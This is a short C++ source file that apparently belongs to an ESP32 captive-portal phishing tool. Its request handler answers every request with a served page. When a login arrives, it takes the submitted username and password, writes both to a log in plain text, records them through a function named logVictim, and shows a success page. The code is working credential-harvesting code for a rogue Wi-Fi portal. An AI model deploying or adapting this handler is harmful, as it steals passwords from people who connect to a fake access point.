#include "hal/cpu_ll.h"
#include "html.h"

class CaptiveRequestHandler : public AsyncWebHandler
{
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request)
    {
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request)
    {

        // Handle requests to /signup
        if (request->url().equalsIgnoreCase("/signup"))
        {
            logMessage("Got signup web req");
            request->send_P(200, "text/html", signup_html);
            return;   
        }

        String inputUsername;
        String inputPassword;

        if (request->hasParam("username"))
        {
            inputUsername = request->getParam("username")->value();
            inputPassword = request->getParam("password")->value();
            logMessage("Got username: " + inputUsername);
            logMessage("Got password: " + inputPassword);
            logVictim(inputUsername, inputPassword);
            request->send_P(200, "text/html", success_html);
            
        }
        else
        {
            logMessage("Got index web req");
            {
                request->send_P(200, "text/html", index_html);
            }
        }
    }
};